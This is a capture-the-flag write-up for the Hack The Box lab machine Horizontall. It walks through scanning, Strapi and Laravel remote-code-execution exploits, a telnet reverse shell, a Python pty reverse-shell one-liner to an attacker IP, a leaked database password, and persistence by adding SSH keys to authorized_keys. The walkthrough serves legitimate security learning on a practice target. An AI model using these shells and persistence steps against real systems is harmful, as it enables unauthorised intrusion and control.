# Horizontall

Horizontall is an easy Linux machine that was released on 28/08/2021.

**Note**: this write-up is quite short and concise as it's based on really brief notes that were taken just for convenience during the pwning of the machine. 

## Enumeration

As usual we start by performing a port scan with nmap

```
nmap -A 10.10.11.105 -p- | tee portscan.txt

Starting Nmap 7.91 ( https://nmap.org ) at 2021-10-30 18:37 EDT
Nmap scan report for horizontall.htb (10.10.11.105)
Host is up (0.066s latency).
Not shown: 65450 closed ports, 83 filtered ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 ee:77:41:43:d4:82:bd:3e:6e:6e:50:cd:ff:6b:0d:d5 (RSA)
|   256 3a:d5:89:d5:da:95:59:d9:df:01:68:37:ca:d5:10:b0 (ECDSA)
|_  256 4a:00:04:b4:9d:29:e7:af:37:16:1b:4f:80:2d:98:94 (ED25519)
80/tcp open  http    nginx 1.14.0 (Ubuntu)
|_http-server-header: nginx/1.14.0 (Ubuntu)
|_http-title: horizontall
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 2501.38 seconds
```

The website is using Vue.js

Taking a look at the js source files, and in particular at `http://horizontall.htb/js/app.c68eb462.js` we can find another interesting url

http://api-prod.horizontall.htb/reviews

We add api-prod.horizontall.htb to our `/etc/hosts` file 

We launch gobuster in dir mode and we discover an 'admin' page with a login form

## Foothold
The CMS of the API seems to be Strapi. With a bit of google-fu, we find out that we can obtain the CMS version by requesting the page `admin/init`, which returns


```json
{
  "data": {
    "uuid": "a55da3bd-9693-4a08-9279-f9df57fd1817",
    "currentEnvironment": "development",
    "autoReload": false,
    "strapiVersion": "3.0.0-beta.17.4"
  }
}
```

Luckily, there's a RCE exploit for this version which uses CVE-2019-18818, CVE-2019-19609

 - CVE-2019-18818 -
strapi before 3.0.0-beta.17.5 mishandles password resets within packages/strapi-admin/controllers/Auth.js and packages/strapi-plugin-users-permissions/controllers/Auth.js. 

 - CVE-2019-19609 -
The Strapi framework before 3.0.0-beta.17.8 is vulnerable to Remote Code Execution in the Install and Uninstall Plugin components of the Admin panel, because it does not sanitize the plugin name, and attackers can inject arbitrary shell commands to be executed by the execa function. 

https://www.exploit-db.com/exploits/50239

python3 exploit.py http://api-prod.horizontall.htb/

we can get a basic reverse shell with

`telnet 10.10.15.42 4242 | /bin/sh | telnet 10.10.15.42 4243`

Now we can copy passwd file and see that the user we want to move to is 'developer'

We can already read user.txt

To improve our shell, we add our own pub key to scrapi authorized_keys file

Now we can ssh into the machine as scrapi.

## Privesc
We run linpeas.sh
```
Some home ssh config file was found
/usr/share/openssh/sshd_config 

-rwsr-xr-x 1 root root 146K Jan 19  2021 /usr/bin/sudo  --->  check_if_the_sudo_version_is_vulnerable 

╔══════════╣ Analyzing Ldap Files (limit 70)
The password hash is from the {SSHA} to 'structural'                                                                                                                  
drwxr-xr-x 2 root root 4096 May 25 11:17 /etc/ldap

---
```

Let's take a look inside the myapi folder in scrapi home directory

It looks like a laravel application. 

We find a MySQL password for user developer in `/opt/strapi/myapi/config/environments/development/database.json`

`#J!:F9Zt2u`

We login into mysql and check the strapi database.
There is a table called strapi_administrator

```
mysql> SELECT * FROM strapi_administrator;
+----+----------+-----------------------+--------------------------------------------------------------+--------------------+---------+
| id | username | email                 | password                                                     | resetPasswordToken | blocked |
+----+----------+-----------------------+--------------------------------------------------------------+--------------------+---------+
|  3 | admin    | admin@horizontall.htb | $2a$10$lMlVj43na5k/ykuJKGu8AeoGnRUGpEVme9zTsiCGwmq7LvknSthLe | NULL               |    NULL |
+----+----------+-----------------------+--------------------------------------------------------------+--------------------+---------+
1 row in set (0.00 sec)
```

That's just the hash of the password we set with the exploit for strapi, we don't need it.

If we run 

`netstat -tulpn | grep LISTEN`

we have a list of all the services which are listening on ports
```
tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN      -                   
tcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN      -                   
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:1337          0.0.0.0:*               LISTEN      1875/node /usr/bin/ 
tcp        0      0 127.0.0.1:8000          0.0.0.0:*               LISTEN      -                   
tcp6       0      0 :::80                   :::*                    LISTEN      -                   
tcp6       0      0 :::22                   :::*                    LISTEN      -   
```

Ports 80 and 22 are the ones we have see from the nmap scan and are open (the address is 0.0.0.0)

The one on port 3306 is just the MySQL server.
The one running on 1337 is the one we reach with api-prod.

There's another one on port 8000. If we try to curl it from the machine we get a welcome page.
Let's create an ssh tunnel to reach this page from our local attacking machine.

We run, on our local machine:

`ssh strapi@horizontall.htb  -L 8001:localhost:8000`

where localhost is because the server we are connecting to is the same that hosts the service we want to reach on port 8000,
8000 is the port we want to be forwarded, and 8001 is the port we will use in the URL on our local browser

Now we can access the webpage from our browser at localhost:8001 and we discover that it's a Laravel web page.

We try to run gobuster but the server stops responding to our requests after a while (maybe we're being rate-limited?)

Anyway, gobuster ran long enough to show us that the 'profiles' page returns a 500

If we try to access the page, we are returned some kind of debugging page

Exploring the web page a bit we find out that the Laravel version is 8.43.0

exploit-db gives us an RCE exploit for Laravel 8.4.2, let's give it a try

https://www.exploit-db.com/exploits/49424
```
Usage:  laravel_exploit.py url path-log command

        Ex: laravel_exploit.py http(s)://pwnme.me:8000 /var/www/html/laravel/storage/logs/laravel.log 'id'

```

We need the location of the `laravel.log` file

From the debug page we can understand the the base Laravel directory is `/home/developer/myproject/`

so the log path for the script will be `/home/developer/myproject/storage/logs/laravel.log`

The complete command is

```sh
python3 laravel_exploit.py http://localhost:8001 /home/developer/myproject/storage/logs/laravel.log 'id'
```

Output:
```
Exploit...

uid=0(root) gid=0(root) groups=0(root)
```

Ok, nice, we have RCE as root on the machine and we can immediately get root.txt

```sh
python3 laravel_exploit.py http://localhost:8001 /home/developer/myproject/storage/logs/laravel.log 'cat /root/root.txt'

```
To get a reverse shell what I did is create a script in a temp directory with the following code
```sh
export RHOST="10.10.15.42";export RPORT=4242;python -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/sh")'
```
and then calling 
```sh
python3 laravel_exploit.py http://localhost:8001 /home/developer/myproject/storage/logs/laravel.log 'bash /tmp/tmp.QcRAAzgyjr/shell.sh'
```

It took a couple of tries launching the same exact command to have a shell, not sure why.

Unfortunately the connection closes after a while, but to get persistent access we can just add our SSH id_rsa.pub file into

`/root/.ssh/authorized_keys`


